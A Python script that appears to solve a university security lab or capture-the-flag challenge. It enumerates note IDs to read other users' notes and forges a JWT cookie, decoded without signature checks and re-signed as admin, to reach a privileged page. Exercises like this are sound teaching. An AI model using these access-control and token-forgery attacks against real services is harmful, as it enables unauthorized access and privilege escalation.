import requests
import re
import os
import jwt
from urllib.parse import urlparse

# Please set your token in the terminal using `export DSS_AUTH_TOKEN=<YOUR-TOKEN>`.
#   DO NOT HARDCODE your token!
TOKEN = os.environ.get("DSS_AUTH_TOKEN")
headers = {
    "DSS-AUTH-TOKEN": TOKEN
}
domain ="0xb2.labs.dss.edu.distrinet-research.be"
REGIST_URL = "https://0xb2.labs.dss.edu.distrinet-research.be/register"
LOGIN_URL = "https://0xb2.labs.dss.edu.distrinet-research.be/login"
NOTES_URL = "https://0xb2.labs.dss.edu.distrinet-research.be/notes/"
START_URL = "https://0xb2.labs.dss.edu.distrinet-research.be"

data = {"username":'henk',"password":'henk'}
with requests.Session() as s:
    #registation and login 
    regist_respons = s.post(REGIST_URL, headers=headers, data=data)
    if regist_respons.status_code != 200:
        print("can not registete")
        exit()
    login_response = s.post(LOGIN_URL, headers=headers, data=data)
    if login_response.status_code != 200:
        print("can not login")
    
    #flag 1
    found_flag = False
    count = 0
    while not found_flag or count > 1000:
        SHARE_URL = NOTES_URL+str(count)
        share_response = s.get(SHARE_URL, headers=headers)
        flag_match = re.search(r"DSS{.*}", share_response.text)
        if flag_match:
            print("flag is found on url: " + SHARE_URL)
            print(flag_match.group(0))
            found_flag = True
        else:
            count += 1

    #flag 2
    #find the number of the note
    note_page = s.get(NOTES_URL, headers=headers)
    find_href_view = re.search(r'<a[^>]*href\s*=\s*["\']?\s*([^"\'\s>]+)\s*["\']?[^>]*>\s*view\s*</a>', note_page.text, re.IGNORECASE)
    if find_href_view:
        flag2_url = find_href_view.group(1)
    else:
        print("no href")
        exit()
    #find the right cookie
    for resp in login_response.history:
        is_very_secret = re.search(r"VERY_SECRET_COOKIE=([^;,\s]+)", resp.headers.get('Set-Cookie'))
        if is_very_secret:
            very_secret_cookie = is_very_secret.group(1)
    #change the cookie
    decoded = jwt.decode(very_secret_cookie, options={"verify_signature": False})
    decoded["username"] = "admin"
    decoded["is_admin"] = True
    secret = "don't check" 
    better_cookie = jwt.encode(decoded, secret, algorithm="HS256")
    
    #set the cookie
    s.cookies.set(name="VERY_SECRET_COOKIE", value=better_cookie, domain=domain, path="/")
    #make the request with the right tickets
    flag2_response = s.get(START_URL+flag2_url,headers=headers)
    #find the request the flag in answer
    flag2_match = re.search(r"DSS{.*}", flag2_response.text)
    if flag2_match:
        print(flag2_match.group(0))
    else: 
        print("error")
